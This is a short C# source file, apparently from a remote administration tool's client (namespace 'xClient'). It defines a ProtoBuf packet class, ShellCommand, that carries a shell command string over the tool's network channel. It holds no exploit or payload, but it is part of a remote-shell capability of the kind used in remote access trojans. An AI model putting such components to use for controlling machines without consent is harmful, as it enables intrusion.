using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class ShellCommand : IPacket
    {
        [ProtoMember(1)]
        public string Command { get; set; }

        public ShellCommand()
        {
        }

        public ShellCommand(string command)
        {
            this.Command = command;
        }

        public void Execute(Client client)
        {
            client.Send<ShellCommand>(this);
        }
    }
}